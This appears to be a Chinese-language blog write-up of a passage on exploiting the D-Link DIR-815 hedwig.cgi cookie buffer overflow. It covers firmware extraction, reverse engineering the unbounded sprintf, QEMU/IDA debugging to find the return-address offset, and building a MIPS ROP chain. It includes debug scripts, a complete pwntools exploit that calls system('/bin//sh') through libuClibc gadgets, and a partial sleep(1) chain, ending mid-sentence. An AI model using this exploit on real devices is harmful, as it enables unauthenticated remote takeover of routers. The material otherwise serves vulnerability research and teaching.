# 前言
去年这个时候第一次分析这个漏洞，当时跟着0day那本书一步一步调试和分析，主要是从qemu用户模式进行分析调试结果写的exp没有getshell，时隔一年再次分析，这次增加了qemu系统模式分析调试,Firmadyne仿真测试以及实体机测试这次可以终于getshell了，这次分析较上次有了更多收获。
# 漏洞介绍
> Buffer overflow on "hedwig.cgi"  
>  Another buffer overflow affects the "hedwig.cgi" CGI script.
> Unauthenticated remote attackers can invoke this CGI with an overly-long
> cookie value that can overflow a program buffer and overwrite the saved
> program address.
D-Link官方安全公告：从漏洞公告中可以看出，该漏洞存在于名为"hedwig.cgi"的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个超长的Cookie值，使得程序栈溢出，从而获得路由器的远程控制权限。
具体详细内容可以在《揭秘家用路由器0day漏洞挖掘技术》一书中找到，接下来我们直接定位漏洞触发函数并进行一系列分析。
# 固件获取及漏洞定位
调试环境：ubuntu16.04 x64和x32，IDA6.8和7.0，qemu2.5
固件下载地址：ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP
## 固件解压
`binwalk -Me`解压
## 漏洞定位
该漏洞的核心组件为hedwig.cgi，`find . -name '*cgi'`查找文件，并`ls -l
./htdocs/web/hedwig.cgi`发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。
由之前的漏洞介绍可以知道`HTTP_COOKIE`过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索`HTTP_COOKIE`
分析一下这个函数，就是提取`HTTP_COOKIE`里面的`uid=`之后的部分。交叉引用一下，找到了`hedwigcgi_main`函数。
`获取到`HTTP_COOKIE`中`uid=`之后的值，并将该内容按照`sprintf`函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。
但是继续往后看该函数中后面还有一个`sprintf`函数，第四个参数同样是`HTTP_COOKIE`中`uid=`后面的内容，这一块按道理来说也可以导致栈溢出。而且如果可以执行该`sprintf`函数则能覆盖之前`sprintf`函数栈上的内容。
在《揭秘家用路由器0day漏洞挖掘技术》一书中写到，如果在文件系统中手工创建`/var/tmp`文件夹，就能够到达第二个`sprintf`函数。我对比了下有无`/var/tmp`文件夹的返回结果:
无`/var/tmp`，返回unable to open temp file。
有`/var/tmp`，返回no xml data。
想着往里面写个/temp.xml文件并添加内容就可以了吧，结果发现还是返回no xml
data。因为fopen打开该文件的方式是'w'，创建一个用于写入的空文件。如果文件名称与已存在的文件相同，则会删除已有文件的内容，文件被视为一个新的空文件。所以只要执行了这条指令文件内容就会被清空，返回值一定是`no
xml data`，所以利用qemu用户模式这样调试的话，是到不了第二个`sprintf`函数。
所以漏洞点是第一个`sprintf`函数。其实有挺多帖子也是分析得到第一个`sprintf`函数是漏洞点，死活到不了第二个sprintf。
## 漏洞重新定位
爆肝一晚，参考一个大佬的[文章](https://kirin-say.top/2019/02/23/Building-MIPS-Environment-for-Router-PWN)，发现了为什么到达不了第二个sprintf的原因。
还需要POST数据包中包含”uid=……”，否则运行不了下面的代码，
    .text:00409AB0                 la      $t9, sobj_strdup
    .text:00409AB4                 lw      $a0, 4($s0)
    .text:00409AB8                 jalr    $t9 ; sobj_strdup
    .text:00409ABC                 nop
    .text:00409AC0                 lw      $ra, 0x20+var_4($sp)
    .text:00409AC4                 lui     $v1, 0x43  # 'C'
    .text:00409AC8                 lw      $gp, 0x20+var_10($sp)
    .text:00409ACC                 lw      $s0, 0x20+var_8($sp)
    .text:00409AD0                 sw      $v0, haystack
    .text:00409AD4                 jr      $ra
    .text:00409AD8                 addiu   $sp, 0x20
从而无法申请一个新的堆空间，这样haystack中值将为0，在运行完第一个sprinf之后会进入loc_4096D4，如果haystack为0将则不会进入loc_4096F0分支，进而跳转不了第二个sprintf()。
    .text:004096D4 loc_4096D4:                              # CODE XREF: hedwigcgi_main+240j
    .text:004096D4                 lw      $v0, haystack
    .text:004096DC                 nop
    .text:004096E0                 bnez    $v0, loc_4096F0
    .text:004096E4                 lui     $v0, 0x42  # 'B'
    .text:004096E8                 b       loc_409A64
    .text:004096EC                 addiu   $a1, $v0, (aNoXmlData_ - 0x420000)  # "no xml data."
如何使POST数据包中包含”uid=……”，看了大佬们的文章还有《0day》那本书中的测试脚本发现，POST具体数据可以通过类似输入流传入 ：echo
"uid=aaa"| /htdocs/web/hedwig.cgi。然后前提也是需要手工创建'/var/tmp'文件夹。
# 漏洞分析与利用
## 漏洞分析
hedwigcgi_main()在调用get_sess_uid函数前需要设置环境变量REQUEST_METHOD为POST。
cgi程序通过getenv的方式获取HTTP数据包中的数据，整个流程应该为:
主Web程序监听端口->传送HTTP数据包->HTTP报文中headers等数据通过环境变量的方式传给cgi处理程序->cgi程序通过getenv获取数据并处理返回给主程序->向客户端返回响应数据
漏洞点sprintf函数
sprintf(栈上的内容,"%s/%s/postxml","/runtime/session",uid的内容)uid的内容是由用户控制的，却没有长度限制，而栈空间有限，hedwigcgi_main同时是一个非叶子函数，那么ra一定存在栈上，我们接下来要做的就是覆盖栈空间内的saved
ra达到控制程序流程的目的。
## 漏洞利用
整个漏洞利用过程是
  * 劫持PC，通过调试确定缓冲区大小，定位并确定控制偏移
  * 确定攻击路径，构造ROP链
  * 编写exp,getshell
## 动态调试确定偏移
利用qemu和IDA进行动态调试,用的是（IDA6.8,qemu2.5）
调试脚本test.sh，其中需要sudo chroot 到文件系统下，然后利用qemu-mipsel-static用户模式进行调试，-E是对应环境变量的参数。-g 指定调试端口，“2> /dev/null” 代表忽略掉错误提示信息。
    #/bin/bash
    test=$(python -c "print 'uid='+open('test','r').read(2000)")
    LEN=$(echo -n "$test" | wc -c)
    PORT="23957"
    cp $(which qemu-mipsel-static) ./qemu
    sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$test -E REQUEST_URL="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi 2>/dev/null
    rm -f ./qemu
在这之前需要利用patternLocOffset.py生成test文件，包含特定格式的2000个字符串。
`python patternLocOffset.py -c -l 2000 -f test`
使用IDA调试发现运行到hedwigcgi_main()返回时ra寄存器中的值为0x38694237
`python patternLocOffset.py -s 0x38694237 -l 2000`确定缓冲区距离ra的距离为1043。
可以通过修改test.sh中的`test =$(python -c "print 'uid=' + 'A'*1043 +
'B'*4")`进一步确定偏移为1043。
以上是触发第一个sprintf()的偏移。
## 重新确定偏移
更改test.sh，在脚本中加入echo "uid=xxx"。
    #!/bin/bash
    #sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`
    INPUT="$1"
    COOKIE="$2"
    PORT="23957"
    LEN=$(echo -n "$INPUT" | wc -c)
    cp $(which qemu-mipsel-static) ./qemu
    echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1"  -g $PORT /htdocs/web/hedwig.cgi
    rm -f ./qemu
执行命令
    sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`
调试之后发现确实能够触发第二个sprintf()。
并且覆盖了ra=68423668。
计算得到偏移为1009。
## 构造ROP链
### 通过system函数getshell
主要目的是调用system('/bin/sh')来getshell，system函数在libc.so中找，参数'/bin/sh'首先放入栈中，然后利用gadget将栈上的'/bin/sh'传入a0寄存器，再调用system函数即可。
#### 定位system函数地址
参考《0day》那本书，首先需要搜索system函数的地址，需要先找到libc.so，然后在libc.so中找到system函数。
通过以下过程：
    gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
    set architecture mips
    target remote :23957
    b *0x409A54 #hedwigcgi_main()函数返回jr ra处
    c
    vmmap
为了以后不用每次都输入固定的指令可以编写一个dbgscript
    set architecture mips
    set endian little
    file htdocs/cgibin
    target remote :23957
    b *0x409a54
gdb-multiarch调试的时候执行`gdb-multiarch -x dbgscript`，-x是指定要执行的命令文件。
得到libuClibc-0.9.30.1.so的基地址为0x76738000。
找到libuClibc-0.9.30.1.so用IDA打开，system函数在0x53200处。
这样就得到了system函数的真实地址0x76738000+0x53200=0x7678b200。
#### 绕过0构造rop链
因为system函数的最低位为\x00，在构造HTTP_COOKIE的时候\x00会被sprintf截断，其实还不用到sprintf函数，之前sess_get_uid函数就获取\x00字符之前的字符串，导致缓冲区溢出失败。所以构造shellcode时需要存入的事0x7678b200-1=0x7678b1ff，之后通过寻址gadget将其加1即可。
首先考虑将栈上地址放入寄存器中，在libuClibc-0.9.30.1.so利用mipsrop插件中的`mipsrop.stackfinder()`命令查找将堆栈中数据放入寄存器的gadget。在0x159cc处发现可将当前栈$sp+0x10处的值存入寄存器s5并跳转至s0。并且在跳转之前将$s5的内容给到$a0，这样system函数的第一个参数就成功了。
继续在libuClibc-0.9.30.1.so中寻找+1的gadget，使用mipsrop插件，`mipsrop.find("addiu
.*,1")`得到31个gadget，找到0x00045988处，将寄存器s0中的值加一。
所以需要将system函数地址减一之后放入s0寄存器中，这个gadget之后是跳转到s1寄存器中的地址。
由IDA中的反汇编代码可以看出我们可以控制数据覆盖ra,fp,s7~s0寄存器。
可以这样构造数据，payload大致如下：
这里参考下H4lo师傅的整个流程图：
对应的exp如下：
    #!/usr/bin/python2
    from pwn import *
    context.endian = "little"
    context.arch = "mips"
    base_addr = 0x76738000
    system_addr_1 = 0x53200-1
    gadget1 = 0x45988
    gadget2 = 0x159cc
    padding = 'A' * 0x3cd
    padding += p32(base_addr + system_addr_1) # s0
    padding += p32(base_addr + gadget2)       # s1
    padding += 'A' * 4                        # s2
    padding += 'A' * 4                        # s3
    padding += 'A' * 4                        # s4
    padding += 'A' * 4                        # s5
    padding += 'A' * 4                        # s6
    padding += 'A' * 4                        # s7
    padding += 'A' * 4                        # fp
    padding += p32(base_addr + gadget1)       # ra
    padding += 'B' * 0x10
    padding += '/bin//sh'
    f = open("exploit",'wb+')
    f.write(padding)
    f.close()
#### 测试结果
执行命令：
    sudo ./test.sh  'uid=1234' `python -c "print 'uid=' + open('exploit','r').read()"`
使用gdb-multiarch联调发现，确实能够跳转到gadget1处（0x76738000+0x45988=0x7677d988），将s0处的system-1地址加一。
之后顺利进入gadget1处(0x76738000+0x159cc=0x7674d9cc)处，将栈上内容(sp+0x10)先加载到s5，并在跳转s0前将s5中内容传给a0。
进入system处，a0参数为/bin//sh。
继续往下执行，发现执行完system函数返回时被中断了，因为当前指令是从(fp+0x10)处取一个字节给$gp，然后当前$fp的内容为0x0，(fp+0x10处)也无法访问，所以自然就报错了。空指针问题
但是在整个rop链运行过程中并没有出现给$fp赋值的操作，所以这块为什么$fp会变成0，变成空指针。这是一个问题，需要解决，应该是还是构造的rop链执行system函数的过程中出现了问题。
### 调用sleep(1)函数
接下来考虑利用另一种方式通过调用sleep(1)函数来getshell，至于为什么利用sleep(1)函数呢，参考这篇[文章](http://xdxd.love/2016/12/09/一个mips栈溢出利用/)，里面有讲到一个问题就是cache
incoherency。MIPS CPUs有两个独立的cache： **指令cache** 和 **数据cache**
。指令和数据分别在两个不同的缓存中。当缓存满了，会触发flush，将数据写回到主内存。
**攻击者的攻击payload通常会被应用当做数据来处理，存储在数据缓存中**
。当payload触发漏洞，劫持程序执行流程的时候，会去执行内存中的shellcode。
**如果数据缓存没有触发flush的话，shellcode依然存储在缓存中，而没有写入主内存。这会导致程序执行了本该存储shellcode的地址处随机的代码，导致不可预知的后果。**
最简单可靠的让缓存数据写入内存的方式是调用一个堵塞函数。比如sleep(1)或者其他类似的函数。sleep的过程中，处理器会切换上下文让给其他正在执行的程序，缓存会自动执行flush。
整个ROP的调用流程参考[H4lo](https://www.anquanke.com/post/id/179510#h3-6)师傅的图。
#### ROP Gadget使用
##### ROP Gadget 1
利用`mipsrop.find("li $a0,1")`寻找到0x57E50处，并且返回时跳转至s1寄存器中地址。
可以将ra处覆盖为`ra=gadget1=0x57E50+libc_base`。之后寻找第二个gadget2将其放入s1，这里不能直接将sleep函数放入s1中，因为sleep函数运行完jr
$ra时，我们控制不了，所以接下来应该是寻找能够控制$ra的gadget2.
##### ROP Gadget 2
利用mipsrop插件中的`mipsrop.tail()`该函数作用是`Prints a lits of all tail call gadgets